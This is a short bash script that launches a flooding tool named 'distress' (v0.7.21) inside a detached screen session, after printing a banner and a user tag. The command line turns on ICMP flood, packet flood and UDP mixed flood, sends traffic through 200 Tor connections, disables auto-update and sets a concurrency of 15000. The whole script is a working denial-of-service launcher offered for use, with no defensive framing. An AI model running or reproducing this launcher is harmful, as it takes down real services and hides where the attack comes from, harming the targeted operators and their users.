#!/bin/bash
cat ita.txt && sleep 2s && echo user Dubna-48㉿ && sleep 2s && echo module - Distress v0.7.21 && echo -------------------------- && sleep 3s && screen -S 'ds' ./distress_x86_64-unknown-linux-musl --use-my-ip 0 --user-id=1473231416 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --disable-auto-update --use-tor 200 -c 15000
